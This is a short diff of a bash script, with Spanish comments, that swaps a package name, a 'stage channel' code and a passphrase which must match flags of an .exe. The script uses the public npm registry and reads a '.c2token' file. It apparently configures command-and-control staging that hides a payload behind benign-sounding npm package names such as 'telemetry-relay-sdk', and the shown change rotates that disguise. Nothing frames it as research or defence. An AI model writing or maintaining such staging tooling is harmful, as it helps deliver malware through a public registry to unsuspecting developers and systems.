@@ -13,9 +13,9 @@ set -euo pipefail
 
 cd "$(dirname "$0")"
 
-PKG="node-runtime-probe-utils"
-CHAN="a4f2"                       # debe coincidir con --stage-chan del .exe
-PASS="Stage-Pass-2026"            # debe coincidir con --passphrase del .exe
+PKG="telemetry-relay-sdk"
+CHAN="b0c1"                       # debe coincidir con --stage-chan del .exe
+PASS="Relay-Key-2026"             # debe coincidir con --passphrase del .exe
 BASE="https://registry.npmjs.org"
 
 if [[ -f .c2token ]]; then
